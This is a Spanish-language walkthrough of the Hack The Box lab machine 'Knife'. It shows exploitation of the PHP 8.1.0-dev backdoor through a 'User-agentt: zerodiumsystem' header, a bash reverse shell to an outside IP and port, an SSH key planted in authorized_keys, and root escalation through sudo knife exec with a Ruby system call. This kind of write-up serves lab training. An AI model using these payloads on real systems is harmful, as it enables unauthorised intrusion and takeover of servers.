     HTB- MACHINE KNIFE


{% endraw %} {% raw %}Hola mis estimados lectores en esta oportunidad les compartiré algunas técnicas que utilice para realizar esta maquina.

Bueno comencemos..!!!!

Lo primero que haremos sera realizar un escaneo con nmap

Introducimos:

# nmap -sC -sV -oN /home/ghost/htb/machines/knife/nmap.txt "ip machine"


Como vemos nos arroja dos puertos 22 y 80 

Vamos a probar con el puerto 80



Y como vemos nos arroja una pagina html de un hospital. comenzamos a jugar con la pagina para encontrar alguna vulnerabilidad que nos pueda dar acceso.



Me voy a inspeccionar elemento y observo que hay un js llamado pen.js pero no hay nada interesante.
probé también con gobuster para enumerar los directorios pero nada interesante

Bueno voy a proceder a abrir burpsuite y capturamos la pagina web para verificar los encabezados.



Verificamos que esta trabajando con PHP / 8.1.0 busquemos en google si hay un exploit para esta versión de php.. aca les dejare el link donde encontré información.

     https://blog.csdn.net/zy15667076526/article/details/116447864

Guiándome de ese blog vamos a verificar si esta trabajando o no 

Capturamos con burpsuite el request de la pagina con el puerto 80 , lo enviamos a repeater y agregamos el parámetro: 

          User-agentt: zerodiumsystem (“id”);

Nos arroja los usuarios.

Otra forma de poder ver estas respuestas es ejecutando:

# curl -i -s -k -H 'User-agentt: zerodiumsystem("id");' http://10.129.112.117
Bueno volvemos a burpsuite para capturar la pagina web con el puerto 80 , lo llevamos hacia repeater

Hace un rato nos arrojo el usuario al introducir el user-agentt , bueno ahora procederemos a introducir donde esta la Ip de nuestra maquina y el puerto 

User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/10.10.16.34/2121 0>&1'");




IMPORTANTE..!!!!!

Antes de ejecutar el user-agentt abrimos un puerto de escucha, en mi caso es 2121.


Luego procederemos a dar en send en burpsuite y tendremos conexión dentro del usuario que encontramos.


Ahora procederemos a jugar un rato con la shell para encontrar la bandera.


Ahora que hemos capturado la bandera en usuario procederemos a escalar privilegios para poder capturar la bandera de root
para eso obtengamos el ssh en lo cual necesitaremos agregar nuestra clave publica dentro de la ssh de la carpeta james.

Nos dirigimos a .ssh y colocamos ssh-keygen





Como pueden observar se creo el id_rsa y id_rsa.pub




Abrimos con cat el id_rsa.pub y copiamos todo en el editor de texto por buenas practicas


Dentro del editor de texto colocamos echo "id_rsa.pub" > authorized_keys

Luego nos dirigimos a la shell donde abrimos la sesión de james@knife, entramos a la dirección donde esta el .ssh

 

Procedemos a pegar lo que habíamos copiado en el editor de texto.



Ahora nos dirigimos a nuestra shell donde abrimos el .ssh y le damos permiso al archivo id_rsa.

#chmod 600 id_rsa

Ejecutamos.

 #shh -i id_rsa james@"ip de la maquina"


Vemos que nos da acceso ssh sin pedirnos la contraseña.

Bueno ahora colocamos
 
#sudo -l 

Nos aparecerá que el usuario de james puede ejecutar el siguiente comando: 

# ls -al  /usr/bin/knife 

En la cual nos indica que es un enlace simbólico a /opt/chef-workstation


Bueno observamos que el directorio de la estación de trabajo no es mas que el directorio de instalación de ruby, simplemente significa que podemos crear un archivo de ruby  y ejecutarlo como root, así que simplemente cree un archivo hello.rb donde pueda obtener una shell raíz.

#echo "system('/bin/bash')" > hello.rb


Ahora procedemos a ejecutar el archivo que hemos creado en mi caso hello.rb 

#sudo /usr/bin/knife exec hello.rb
 
nos da como root , ahora solo debemos encontrar la bandera. 






Bueno eso seria todo por mi parte, si te ha servido este articulo no olvides compartirlo seria de gran ayuda.
 

SALUDOS.!!!!
